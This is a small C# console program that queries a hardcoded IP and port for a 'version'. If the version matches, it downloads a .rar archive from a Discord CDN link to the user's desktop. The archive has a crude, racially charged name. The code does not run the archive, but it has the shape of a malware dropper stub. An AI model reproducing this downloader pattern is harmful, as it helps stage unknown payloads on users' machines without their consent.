using System;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Text;
using Newtonsoft.Json;
using Spectre.Console;


class Program
{

    public static void DownloadFile(string Url, string Path) => new WebClient().DownloadFile(Url, Path);

    static async Task Main(string[] args)
    {
        string apiEndpoint = "http://147.185.221.18:17182/api/version";
        string expectedVersion = "1.0.0"; // Replace with your expected version
        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);


        if (await IsApiVersionCorrect(apiEndpoint, expectedVersion))
        {
            Console.WriteLine("API version is correct. Downloading another app...");
            DownloadFile("https://cdn.discordapp.com/attachments/1188234103103946844/1203156822933110916/OILED_UP_BLACK_MEN.rar?ex=65d0121c&is=65bd9d1c&hm=11d0f7cbbcd75fba922e760d01f4ae1b40e7502edeb6db4731e2792629757789&", desktopPath + "\\OILED_BLACK_MEN.rar");
        }
        else
        {
            Console.WriteLine("API version is incorrect. Exiting...");
            
        }
    }

    static async Task<bool> IsApiVersionCorrect(string apiEndpoint, string expectedVersion)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                // Make a request to the API endpoint
                HttpResponseMessage response = await client.GetAsync(apiEndpoint);

                if (response.IsSuccessStatusCode)
                {
                    // Read the response content as a string
                    string jsonContent = await response.Content.ReadAsStringAsync();

                    // Parse the JSON to get the version information
                    JObject apiResponse = JObject.Parse(jsonContent);
                    string actualVersion = apiResponse["version"].ToString();

                    // Compare the actual version with the expected version
                    return actualVersion == expectedVersion;
                }
                else
                {
                    Console.WriteLine($"Failed to retrieve API version. Status code: {response.StatusCode}");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }

        return false;
    }
}